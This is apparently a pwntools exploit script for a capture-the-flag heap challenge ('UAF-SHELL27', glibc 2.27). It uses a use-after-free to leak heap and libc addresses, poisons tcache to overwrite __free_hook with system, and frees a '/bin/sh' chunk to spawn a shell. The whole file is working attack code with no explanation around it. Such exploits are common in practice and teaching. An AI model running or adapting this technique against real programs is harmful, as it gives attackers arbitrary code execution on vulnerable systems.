
#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF-SHELL27')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')
elf = ELF('./UAF-SHELL27')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

#==========================heapbase============================

add(0x10) #0
add(0x10) #1
delete(1)
delete(0)
show(0)
heapbase = u64(p.recv(6).ljust(8, "\x00")) - 0x280
pr('heapbase',heapbase)
add(0x10) #2
add(0x10) #3

#=========================libcbase=============================

add(0x500) #4
add(0x10)  #5
delete(4)

show(4)
leak = u64(p.recv(6).ljust(8, "\x00"))
libcbase = leak - 0x3ebca0 #0x3ebca0
system = libcbase + libc.sym['system']
free_hook = libcbase + libc.sym['__free_hook']
pr('libcbase',libcbase)

#==============================================================

delete(5) 
edit(5,p64(free_hook))
add(0x10) #6
add(0x10) #7
edit(7,p64(system)) # free_hook into system

#==============================================================

add(0x300) #8
edit(8,'/bin/sh')

delete(8)
p.interactive()

